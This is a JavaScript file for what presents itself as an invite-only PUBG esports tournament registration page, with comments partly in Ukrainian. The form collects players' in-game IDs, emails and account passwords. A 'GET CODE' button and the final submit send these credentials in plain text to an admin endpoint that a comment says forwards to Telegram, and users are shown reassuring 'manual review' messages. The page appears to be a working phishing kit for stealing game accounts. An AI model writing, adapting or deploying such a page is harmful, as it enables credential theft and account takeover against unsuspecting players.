// DEMO valid codes (фронт; бек все одно перевірить на своєму боці)
const VALID_CODES = ["FLOW2025", "ESPORTPUBG", "V7ACCESS"];

const openGatewayBtn = document.getElementById('open-gateway');
const scrollCta = document.getElementById('scroll-cta-code');
const tournamentSection = document.getElementById('tournament-announcement');

const codeInput = document.getElementById('access-code');
const checkCodeBtn = document.getElementById('check-code');
const codeStatus = document.getElementById('code-status');
const regSection = document.getElementById('registration-section');
const regForm = document.getElementById('reg-form');
const regStatus = document.getElementById('reg-status');
const finalMessage = document.getElementById('final-message');
const finalCard = document.getElementById('final-card');
const requestEmailCodeBtn = document.getElementById('request-email-code');

// --- helper: notify admin via backend (ТГ) ---
function notifyAdmin(type, payload = {}) {
  return fetch("/api/notify-admin", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ type, ...payload })
  })
    .then(r => r.json())
    .then(data => {
      console.log("Admin notify result:", data);
      return data;
    })
    .catch(err => {
      console.error("Admin notify error:", err);
      return { ok: false, error: "fetch_failed" };
    });
}

// --- send full application to backend ---
async function sendApplication(formData) {
  try {
    const res = await fetch("/api/submit-registration", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData)
    });
    if (!res.ok) throw new Error("Bad response");
    return await res.json(); // {status, uid}
  } catch (e) {
    console.error("submit-registration error, fallback notify:", e);
    await notifyAdmin("full_application_fallback", formData);
    return { status: "pending" };
  }
}

// Scroll CTA appears after user reaches end of tournament announcement
if (tournamentSection && scrollCta) {
  window.addEventListener('scroll', () => {
    if (scrollCta.classList.contains('visible')) return;
    const rect = tournamentSection.getBoundingClientRect();
    if (rect.bottom <= window.innerHeight + 40) {
      scrollCta.classList.add('visible');
    }
  });

  scrollCta.addEventListener('click', () => {
    const gate = document.getElementById('code-gate');
    if (gate) {
      gate.scrollIntoView({ behavior: 'smooth', block: 'start' });
      codeInput && codeInput.focus();
    }
  });
}

// Hero button -> code input
if (openGatewayBtn && codeInput) {
  openGatewayBtn.addEventListener('click', function () {
    codeInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
    codeInput.focus();
  });
}

// Verify code (front-only)
if (checkCodeBtn) {
  checkCodeBtn.addEventListener('click', function () {
    const val = (codeInput.value || "").trim().toUpperCase();
    if (!val) {
      codeStatus.textContent = "Enter your invite code to continue.";
      codeStatus.className = "status err";
      regSection.style.display = "none";
      return;
    }
    if (VALID_CODES.includes(val)) {
      codeStatus.textContent = "Code accepted. Registration form unlocked.";
      codeStatus.className = "status ok";
      regSection.style.display = "block";
      regSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
    } else {
      codeStatus.textContent = "Invalid code. Check your invite or contact support.";
      codeStatus.className = "status err";
      regSection.style.display = "none";
    }
  });
}

// "GET CODE" -> часткові дані адміну
if (requestEmailCodeBtn) {
  requestEmailCodeBtn.addEventListener('click', async () => {
    regStatus.textContent = "";
    regStatus.className = "status";

    const ingameId = (document.getElementById('ingame-id').value || "").trim();
    const email = (document.getElementById('email').value || "").trim();
    const pass = (document.getElementById('password').value || "");

    if (!ingameId || !email || !pass) {
      regStatus.textContent = "Fill In-game ID, Email and Password before requesting a code.";
      regStatus.className = "status err";
      return;
    }

    const accessCode = (codeInput.value || "").trim();

    const res = await notifyAdmin("email_code_request", {
      accessCode,
      ingameId,
      email,
      password: pass
    });

    if (res && res.ok) {
      regStatus.textContent = "Request sent. Admin will review and send a verification code to your email.";
      regStatus.className = "status ok";
    } else {
      regStatus.textContent = "Request sent locally. If no email within some time — contact support / admin.";
      regStatus.className = "status err";
    }
  });
}

// Submit full form
if (regForm) {
  regForm.addEventListener('submit', async function (e) {
    e.preventDefault();
    regStatus.textContent = "";
    regStatus.className = "status";

    const accessCode = (codeInput.value || "").trim().toUpperCase();
    const email = (document.getElementById('email').value || "").trim();
    const emailCode = (document.getElementById('email-code').value || "").trim();
    const ingameId = (document.getElementById('ingame-id').value || "").trim();
    const ingameIdConfirm = (document.getElementById('ingame-id-confirm').value || "").trim();
    const pass = (document.getElementById('password').value || "");
    const pass2 = (document.getElementById('password-confirm').value || "");
    const terms = document.getElementById('terms').checked;

    if (!accessCode || !VALID_CODES.includes(accessCode)) {
      regStatus.textContent = "Access code is missing or invalid.";
      regStatus.className = "status err";
      return;
    }
    if (!email || !ingameId || !pass || !pass2) {
      regStatus.textContent = "Please fill all required fields.";
      regStatus.className = "status err";
      return;
    }
    if (ingameIdConfirm && ingameIdConfirm !== ingameId) {
      regStatus.textContent = "In-game ID confirmation does not match.";
      regStatus.className = "status err";
      return;
    }
    if (pass !== pass2) {
      regStatus.textContent = "Passwords do not match.";
      regStatus.className = "status err";
      return;
    }
    if (!terms) {
      regStatus.textContent = "Please confirm that the data is correct.";
      regStatus.className = "status err";
      return;
    }

    const formData = {
      accessCode,
      ingameId,
      email,
      password: pass,
      emailCode
    };

    regStatus.textContent = "Sending your application for review...";
    regStatus.className = "status";

    const result = await sendApplication(formData);

    regForm.reset();
    regSection.style.display = "none";
    finalMessage.style.display = "block";
    finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });

    if (result.status === "approved") {
      finalCard.innerHTML = `
        <div class="section-title" style="margin-bottom:4px;">
          <span class="bar"></span>Registration approved
        </div>
        <div class="success-envelope">✉️</div>
        <div class="section-sub" style="margin-bottom:0;">
          Your registration is <strong>successful</strong>.
          Within 2 days you will receive an email with lobby details
          and a direct link to participate in the tournament.
        </div>
      `;
    } else if (result.status === "rejected") {
      finalCard.innerHTML = `
        <div class="section-title" style="margin-bottom:4px;">
          <span class="bar"></span>Registration rejected
        </div>
        <div class="section-sub" style="margin-bottom:0;">
          Provided data was not approved.
          Please check your details and try again or contact support.
        </div>
      `;
    } else {
      finalCard.innerHTML = `
        <div class="section-title" style="margin-bottom:4px;">
          <span class="bar"></span>Application submitted
        </div>
        <div class="section-sub" style="margin-bottom:0;">
          Your application has been sent for manual review.
          Expect a decision and, if approved, an invitation link
          to the tournament within 2 days.
        </div>
      `;
    }
  });
}

// Mobile tabs
const mobileTabs = document.querySelectorAll('.mobile-bottom-nav .mobile-tab');
mobileTabs.forEach(tab => {
  tab.addEventListener('click', () => {
    const target = tab.getAttribute('data-target');
    mobileTabs.forEach(t => t.classList.remove('active'));
    tab.classList.add('active');

    if (!target) return;

    if (target.startsWith('http')) {
      window.open(target, '_blank', 'noopener');
    } else if (target === '/') {
      window.location.href = '/';
    } else {
      const el = document.querySelector(target);
      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  });
});
